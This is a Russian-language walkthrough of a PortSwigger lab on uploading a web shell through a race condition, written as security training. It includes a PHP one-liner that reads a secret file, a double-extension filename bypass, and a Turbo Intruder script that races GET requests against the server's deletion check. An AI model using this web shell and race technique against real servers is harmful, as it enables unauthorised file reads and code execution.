# Web shell upload via race condition

## Theory

<h3>Использование условий гонки при загрузке файлов</h3>

Современные фреймворки более защищены от подобных атак. Как правило, они не загружают файлы напрямую в предполагаемое место назначения в файловой системе. Вместо этого они принимают меры предосторожности, такие как загрузка во временный изолированный каталог и случайное имя, чтобы избежать перезаписи существующих файлов. Затем они выполняют проверку этого временного файла и передают его в место назначения только после того, как это будет сочтено безопасным.

Тем не менее, разработчики иногда реализуют собственную обработку загрузки файлов независимо от какой-либо платформы. Мало того, что это довольно сложно сделать хорошо, это также может привести к опасным условиям гонки, которые позволяют злоумышленнику полностью обойти даже самую надежную проверку.

Например, некоторые веб-сайты загружают файл непосредственно в основную файловую систему, а затем снова удаляют его, если он не проходит проверку. Такое поведение типично для веб-сайтов, которые полагаются на антивирусное программное обеспечение и тому подобное для проверки на наличие вредоносных программ. Это может занять всего несколько миллисекунд, но пока файл существует на сервере, злоумышленник потенциально может его выполнить.

Эти уязвимости часто очень незаметны, что затрудняет их обнаружение во время тестирования черного ящика, если вы не можете найти способ утечки соответствующего исходного кода.

## Writeup

* Имеющиеся данные: 
    * Данные нашего аккаунта: wiener:peter

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/1.png)

Логинимся c имеющимися данными. У нас есть возможность загрузки аватара пользователя. Загрузим экплоит. Мы получаем сообщение о том, что мы можем загружать только картинки.

Код эксплоита:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/3.png)

Попробуем снова загрузить наш экплоит. Перехватим запрос. Изменим название файла на **exploit.php.jpg**, добавив еще одно расширение. Файл успешно загружен.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/4.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/5.png)

Воспользуем Turbo Intruder. При отправке файла, он некоторое время находится на сервере, и только потом удаляется в ходе проверки. Мы отправим файл и несколько GET запросов, чтобы успеть открыть его до удаления. Мы будем использовать следующий код, чтобы отправлять запросы. 
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

Возьмем POST запрос /my-account/avatar и скопируем все содержимое. Вставим скопированный запрос в request1.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/6.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/7.png)

Затем скопируем GET запрос /files/avatars/exploit.php.jpg для открытия файла. Вставим его в request2, удалив расшрение .jpg.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/8.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/9.png)

Запускаем атаку. Некоторые запросы на открытие эксплоита прошли успешно, поэтому мы можем видеть содержимое необходимого нам файла.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/10.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/File_upload_vulnerabilities/Web_shell_upload_via_race_condition/assets/11.png)
